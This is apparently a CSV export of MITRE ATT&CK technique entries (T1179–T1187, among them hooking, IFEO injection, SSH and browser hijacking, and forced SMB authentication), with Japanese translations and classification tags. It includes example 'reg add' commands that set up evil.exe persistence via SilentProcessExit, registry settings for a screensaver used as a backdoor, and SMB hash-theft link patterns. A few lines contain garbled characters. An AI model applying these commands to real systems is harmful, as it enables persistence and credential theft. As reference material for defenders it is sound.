T1179,,Hooking,フッキング,"Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via: * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Elastic Process Injection July 2017) * **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Elastic Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015) * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Elastic Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use. Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Hooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)",Windowsプロセスは、再利用可能なシステムリソースを必要とするタスクを実行するために、アプリケーションプログラミングインターフェイス（API）関数を頻繁に利用します。Windows API関数は通常、エクスポート関数としてダイナミックリンクライブラリ（DLL）に格納されています。フッキングは、これらの関数への呼び出しをリダイレクトする行為であり、以下を通じて実装されます：* **フックプロシージャ**：メッセージ、キーストローク、マウス入力などのイベントに応答して、指定されたコードをインターセプトして実行します。 (引用元: Microsoft Hook Overview) (引用元: Elastic Process Injection July 2017)* **インポートアドレステーブル(IAT)フッキング**: インポートされたAPI関数へのポインタが格納されるプロセスのIATを改変する手法。(引用元: Elastic Process Injection July 2017) (出典: Adlice Software IAT Hooks Oct 2014) (出典: MWRInfoSecurity Dynamic Hooking 2015) * **インラインフッキング**。API関数の先頭バイトを上書きし、コードフローをリダイレクトする手法。(出典: Elastic Process Injection July 2017) (出典: HighTech Bridge Inline Hooking Sept 2011) (引用: MWRInfoSecurity Dynamic Hooking 2015) [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、攻撃者はフッキングを利用して別のプロセスのコンテキスト内で悪意のあるコードをロード・実行し、実行を隠蔽すると同時に、そのプロセスのメモリや場合によっては昇格された特権へのアクセスを可能にする。 フッキング機構のインストールは、通常の使用時に関数が呼び出されることで継続的な起動を介した永続化を提供する可能性もある。悪意のあるフッキング機構は、ユーザー認証資格情報を明かすパラメータを含むAPI呼び出しをキャプチャし、資格情報アクセスを可能にする場合もある。 (引用元: Microsoft TrojanSpy:Win32/Ursnif.gen!I 2017年9月)フッキングは、マルウェアや関連動作を隠蔽するため、ファイル・プロセス・レジストリキー等のオブジェクトを隠す手段として[ルートキット](https://attack.mitre.org/techniques/T1014)で広く利用される。(引用元: Symantec Windows Rootkits),persistence;privilege-escalation;credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0006,attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5,2018-01-16T16:13:52.465Z,2025-04-25T15:15:38.681Z,,,,
T1180,,Screensaver,スクリーンセーバー,"Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence: * <code>SCRNSAVE.exe</code> - set to malicious PE path * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)",スクリーンセーバーは、ユーザーが設定した時間操作を行わなかった後に実行されるプログラムであり、拡張子 .scr のポータブル実行可能ファイル (PE) で構成されています。(引用元: Wikipedia Screensaver) Windows スクリーンセーバーアプリケーション scrnsave.scr は、<code>C:\Windows\System32\</code> および 64 ビット Windows システムでは <code>C:\Windows\sysWOW64\</code> に、Windows の基本インストールに含まれるスクリーンセーバーとともに配置されています。 以下のスクリーンセーバー設定はレジストリ（<code>HKCU\Control Panel\Desktop\</code>）に保存され、永続化を達成するために操作される可能性があります：* <code>SCRNSAVE.exe</code> - 悪意のあるPEファイルのパスに設定* <code>ScreenSaveActive</code> - スクリーンセーバーを有効にするには'1'に設定* <code>ScreenSaverIsSecure</code> - 解除にパスワード不要にするには '0' に設定 * <code>ScreenSaveTimeout</code> - スクリーンセーバー実行前のユーザー非操作タイムアウトを設定攻撃者は、ユーザーが一定時間操作しない場合にマルウェアを実行するようスクリーンセーバーを設定することで、持続性を維持できます。（出典: ESET Gazer 2017年8月）,persistence,Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae,2018-01-16T16:13:52.465Z,2025-04-25T15:15:17.963Z,,,,
T1181,,Extra Window Memory Injection,追加ウィンドウメモリ注入,"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function) Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. Execution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",グラフィカルなWindowsベースのプロセスは、ウィンドウを作成する前に、外観と動作を規定するウィンドウクラスを指定または登録する必要があります（データ入出力を処理する関数であるウィンドウプロシージャを介して）。（引用元: Microsoft Window Classes）新しいウィンドウクラスの登録には、そのクラスの各インスタンスに割り当てられたメモリに最大40バイトの追加ウィンドウメモリ（EWM）を付加する要求が含まれる場合があります。 このEWMは当該ウィンドウ固有のデータを格納することを目的としており、その値を設定・取得するための特定のアプリケーションプログラミングインターフェース（API）関数が用意されている。（引用元：Microsoft GetWindowLong関数）（引用元：Microsoft SetWindowLong関数）EWMは小さいながらも32ビットポインタを格納するのに十分な大きさであり、Windowsプロシージャを指すために頻繁に使用される。 マルウェアは、攻撃チェーンの一環としてこのメモリ領域を利用することがあり、具体的にはプロセスの共有セクションにコードを書き込む→EWMにコードへのポインタを配置する→プロセスのEWM内のアドレスに実行制御を戻すことでコードを呼び出す、といった手法が考えられる。EWMインジェクションによる実行は、別の実行中プロセスのアドレス空間内で発生する可能性がある。 [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これによりターゲットプロセスのメモリへのアクセスと、場合によっては昇格された特権の取得が可能となる。共有セクションへのペイロード書き込みは、WriteProcessMemoryやCreateRemoteThreadといった厳重に監視されるAPI呼び出しの使用も回避する。（引用元: Elastic Process Injection July 2017) より洗練されたマルウェアサンプルは、Windowsプロシージャとその他のシステム機能を組み合わせてトリガーすることで、データ実行防止(DEP)などの保護メカニズムをバイパスする可能性もあります。これにより、標的プロセスの実行可能領域内に悪意のあるペイロードが書き換えられます。(引用元: MalwareTech Power Loader Aug 2013) (引用元: WeLiveSecurity Gapz and Redyms Mar 2013),defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0,2018-01-16T16:13:52.465Z,2025-04-25T15:15:32.678Z,,,,
T1182,,AppCert DLLs,AppCert DLL,"Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> 配下の AppCertDLLs レジストリキーで指定されたダイナミックリンクライブラリ（DLL）は、汎用的に使用されるアプリケーションプログラミングインターフェース（API）関数 CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW、または WinExec を呼び出すすべてのプロセスに読み込まれる。 （引用元：Elastic Process Injection 2017年7月）[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、この値を悪用することで、悪意のあるDLLをコンピュータ上の別プロセスコンテキストでロード・実行させ、永続化や権限昇格を実現することが可能です。,persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025,2018-01-16T16:13:52.465Z,2025-04-25T15:15:30.363Z,,,,
T1183,,Image File Execution Options Injection,イメージファイル実行オプションの注入,"Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g notepad.exe E. (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018) * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" /v GlobalFlag /t REG_DWORD /d 512</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v ReportingMode /t REG_DWORD /d 1</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v MonitorProcess /d ""C:\temp\evil.exe""</code> Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation. Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)","イメージファイル実行オプション (IFEO) により、開発者はアプリケーションにデバッガーをアタッチすることができます。プロセスが作成されると、アプリケーションの IFEO に存在するデバッガーがアプリケーションの名前の前に付加され、事実上、デバッガーの下で新しいプロセスが起動されます (例: 「C:\dbg\ntsd.exe -g notepad.exe E. (引用元: Microsoft Dev Blog IFEO 2010年3月) IFEO は、レジストリから直接、または GFlags ツールを使用してグローバルフラグで設定できます。 (引用元: Microsoft GFlags 2017年3月) IFEO は、レジストリの <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<実行可能ファイル名></code> 配下の <code>Debugger</code> 値として表現されます。ここで <code><実行可能ファイル名></code> は、デバッガーがアタッチされるバイナリです。 (引用元: Microsoft Dev Blog IFEO 2010年3月) IFEOは、指定されたプログラムがサイレント終了（自身またはカーネルモード以外の第二のプロセスによって早期に終了されること）した際に、任意の監視プログラムを起動することも可能にします。(引用元: Microsoft Silent Process Exit 2017年11月) (引用元: Oddvar Moe IFEO 2018年4月) デバッガーと同様に、サイレント終了監視はGFlags経由、または<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>内のIEFOおよびサイレントプロセス終了レジストリ値を直接変更することで有効化できます。 (引用元: Microsoft Silent Process Exit NOV 2017) (引用元: Oddvar Moe IFEO APR 2018) notepad.exe が終了した際に evil.exe プロセスが起動される例: (引用元: Oddvar Moe IFEO APR 2018) * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" /v GlobalFlag /t REG_DWORD /d 512</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v ReportingMode /t REG_DWORD /d 1</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v MonitorProcess /d ""C:\temp\evil.exe""</code> [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値は悪意のある実行ファイルをコンピュータ上の別プロセスコンテキストで読み込み実行させることで、永続化や権限昇格を悪用される可能性があります。 (引用元: Elastic Process Injection 2017年7月) IFEOメカニズムのインストールは、継続的な呼び出しによる永続化も提供します。マルウェアはまた、無効なデバッガーを登録して様々なシステムおよびセキュリティアプリケーションをリダイレクトし、事実上無効化することで、防御回避のためにIFEOを利用する場合があります。(引用元: FSecure Hupigon) (引用元: Symantec Ushedix 2008年6月)",privilege-escalation;persistence;defense-evasion,Windows,config_policy_manipulation,privilege_gain,endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003;TA0005,attack-pattern--62166220-e498-410f-a90a-19d4339d4e99,2018-01-16T16:13:52.465Z,2025-04-25T15:15:36.905Z,,,,
T1184,,SSH Hijacking,SSHハイジャック,"Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair. In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH) [SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",Secure Shell（SSH）は、LinuxおよびmacOSシステムにおける標準的なリモートアクセス手段である。ユーザーは暗号化されたトンネルを介して別のシステムに接続でき、通常はパスワード、証明書、または非対称暗号鍵ペアを使用した認証を行う。侵害されたホストから横方向に移動するため、攻撃者はアクティブなSSHセッションにおける公開鍵認証によって確立された他のシステムとの信頼関係を悪用し、別のシステムへの既存接続を乗っ取る可能性がある。 これはSSHエージェント自体の侵害、またはエージェントソケットへのアクセス取得によって発生する可能性があります。攻撃者がrootアクセス権を取得できれば、SSHセッションの乗っ取りは容易です。(引用: Slideshare Abusing SSH) (引用: SSHjack Blackhat) (引用: Clockwork SSH Agent Hijacking) SSHエージェントの侵害は、SSH認証情報の傍受手段も提供します。 （引用元：Welivesecurity Ebury SSH）[SSHハイジャック](https://attack.mitre.org/techniques/T1184)は、 [リモートサービス](https://attack.mitre.org/techniques/T1021)とは異なり、[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して新規セッションを作成するのではなく、既存のSSHセッションに注入します。,lateral-movement,Linux;macOS,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb,2018-01-16T16:13:52.465Z,2025-04-25T15:16:06.492Z,,,,
T1185,,Browser Session Hijacking,ブラウザセッションハイジャック,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser) A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights. Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",攻撃者は、ブラウザソフトウェアのセキュリティ脆弱性や固有の機能を利用し、様々なブラウザセッションハイジャック技術の一環として、コンテンツの変更、ユーザー行動の改変、情報の傍受を行う可能性があります。（出典: Wikipedia Man in the Browser）具体的な例として、攻撃者がブラウザにソフトウェアを注入し、ユーザーのクッキー、HTTPセッション、SSLクライアント証明書を継承できるようにした後、そのブラウザを認証済みイントラネットへの足掛かりとして利用するケースが挙げられます。（出典：Cobalt Strike Browser Pivot）（出典：ICEBRG Chrome Extensions）ピボットなどのブラウザベースの動作を実行するには、<code>SeDebugPrivilege</code>や高完全性/管理者権限などの特定のプロセス権限が必要となる場合があります。 別の例として、ウェブトラフィックをリダイレクトするプロキシを設定し、攻撃者のブラウザからユーザーのブラウザへブラウザトラフィックをピボットする方法がある。これはユーザーのトラフィックを一切変更せず、ブラウザを閉じればプロキシ接続は切断される。攻撃者はプロキシが注入されたブラウザプロセスのセキュリティコンテキストを引き継ぐ。ブラウザは通常、開くタブごとに新しいプロセスを作成し、権限と証明書はそれに応じて分離される。 これらの権限により、攻撃者はブラウザ経由でアクセス可能かつ十分な権限を持つイントラネット上のあらゆるリソース（例：[Sharepoint](https://attack.mitre.org/techniques/T1213/002) やウェブメール）を閲覧できる可能性がある。ブラウザピボッティングは二要素認証によるセキュリティも回避し得る。（出典：cobaltstrikeマニュアル）,collection,Windows,credential_abuse,asset_access,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47,2018-01-16T16:13:52.465Z,2025-04-25T15:15:33.428Z,,,,
T1186,,Process Doppelgänging,プロセス・ドッペルゲンガー,"Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF) Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017) Adversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017) Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017): * Transact  ECreate a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. * Load  ECreate a shared section of memory and load the malicious executable. * Rollback  EUndo changes to original executable, effectively removing malicious code from the file system. * Animate  ECreate a process from the tainted section of memory and initiate execution.",Windows トランザクショナル NTFS (TxF) は、安全なファイル操作を実行する方法として Vista で導入されました。(引用元: Microsoft TxF) データ整合性を確保するため、TxF は特定の時点でファイルへの書き込みを許可するトランザクションハンドルを 1 つだけに制限します。書き込みハンドルによるトランザクションが終了するまで、他のすべてのハンドルは書き込み元から隔離され、ハンドルが開かれた時点で存在したコミット済みバージョンのファイルのみを読み取ることができます。 (引用元: Microsoft Basic TxF Concepts) 破損を回避するため、TxFは書き込みトランザクション中にシステムまたはアプリケーションが失敗した場合、自動的にロールバックを実行します。(引用元: Microsoft Where to use TxF) 非推奨となっているものの、TxFアプリケーションプログラミングインターフェイス(API)はWindows 10時点でも有効です。 (引用元: BlackHat Process Doppelgänging Dec 2017) 攻撃者はTxFを悪用し、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のファイルレス版である「プロセスドッペルゲンガー攻撃」を実行する可能性があります。 [プロセスホローイング](https://attack.mitre.org/techniques/T1093)と同様に、プロセスドッペルゲンガーは正当なプロセスのメモリを置き換えることで、防御や検知を回避する可能性のある悪意のあるコードを隠蔽して実行することを可能にします。 プロセスドッペルゲンガーがTxFを利用することで、NtUnmapViewOfSection、VirtualProtectEx、SetThreadContextといった監視の厳しいAPI関数の使用も回避されます。 （出典：BlackHat Process Doppelgänging Dec 2017）プロセス・ドッペルゲンギングは4段階で実装される（出典：BlackHat Process Doppelgänging Dec 2017）：* トランザクション  正規の実行ファイルでTxFトランザクションを作成し、ファイルを悪意のあるコードで上書きする。これらの変更はトランザクションのコンテキスト内でのみ可視化され、隔離される。 * ロード  ECheme メモリの共有セクションを作成し、悪意のある実行ファイルをロードする。* ロールバック  EUndo 元の実行ファイルへの変更を元に戻し、ファイルシステムから悪意のあるコードを効果的に除去する。* アニメート  ECreate 汚染されたメモリセクションからプロセスを作成し、実行を開始する。,defense-evasion,Windows,other,stealth,endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76,2018-01-16T16:13:52.465Z,2025-04-25T15:16:06.307Z,,,,
T1187,,Forced Authentication,強制認証,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security) Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB) There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include: * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017) * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",攻撃者は、傍受可能なメカニズムを通じてユーザーに認証情報の自動提供を強制または誘発し、認証情報を収集する可能性がある。サーバーメッセージブロック（SMB）プロトコルは、Windowsネットワークにおいてリソースアクセスやファイル共有のためのシステム間認証・通信に広く使用される。WindowsシステムがSMBリソースへの接続を試みると、自動的に認証を試行し、現在のユーザーの認証情報をリモートシステムに送信する。 (出典: Wikipedia Server Message Block) この動作は企業環境では一般的であり、ユーザーがネットワークリソースにアクセスする際に認証情報を入力する必要がありません。Web Distributed Authoring and Versioning (WebDAV) も、SMBがブロックされたり失敗したりした場合のバックアッププロトコルとして、Windowsシステムで一般的に使用されます。WebDAVはHTTPの拡張であり、通常TCPポート80および443で動作します。 (引用: Didier Stevens WebDAV Traffic) (引用: Microsoft Managing WebDAV Security) 攻撃者はこの動作を悪用し、強制的なSMB/WebDAV認証を通じてユーザーアカウントハッシュへのアクセスを得ることが可能です。攻撃者はスピアフィッシングにより、攻撃者が制御する外部サーバーへのリソースリンクを含む添付ファイルをユーザーに送信できます（例: [テンプレートインジェクション](https://attack.mitre.org/techniques/T1221))、あるいは特権アカウントのナビゲーションパス上（例：デスクトップに配置された.SCFファイル）や被害者がアクセス可能な公開共有上に、細工を施したファイルを配置する可能性があります。 ユーザーのシステムが信頼できないリソースにアクセスすると、認証を試行し、ユーザーのハッシュ化された認証情報を含む情報をSMB経由で攻撃者が制御するサーバーに送信します。 (引用元: GitHub Hashjacking) 認証情報のハッシュを入手すると、攻撃者はオフラインで [ブルートフォース](https://attack.mitre.org/techniques/T1110) クラッキングを行い、平文の認証情報を入手することができます。(引用元: Cylance Redirect to SMB) これはいくつかの異なる方法で発生する可能性があります。 (引用元: Osanda Stealing NetNTLM Hashes) 実環境での具体的な手法には以下が含まれる:* 標的型フィッシングメールの添付ファイルに、文書を開くと自動的にリソースが読み込まれる形式の文書を含める（例: [テンプレートインジェクション](https://attack.mitre.org/techniques/T1221)）。 文書には、例えば<code>file[:]//[リモートアドレス]/Normal.dotm</code>のようなリクエストを含めることでSMBリクエストをトリガーできる。 (出典: US-CERT APT Energy Oct 2017)* アイコンファイル名が<code>\\[リモートアドレス]\pic.png</code>のような外部参照を指すように改変された.LNKまたは.SCFファイル。これにより、アイコンがレンダリングされるたびにシステムがリソースを強制的に読み込み、認証情報を繰り返し収集する。(出典: US-CERT APT Energy Oct 2017),credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;network_connectivity;file_storage_access,specified,AD / Directory Server;Backup Server;Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2,2018-01-16T16:13:52.465Z,2025-04-15T22:36:48.417Z,,,,
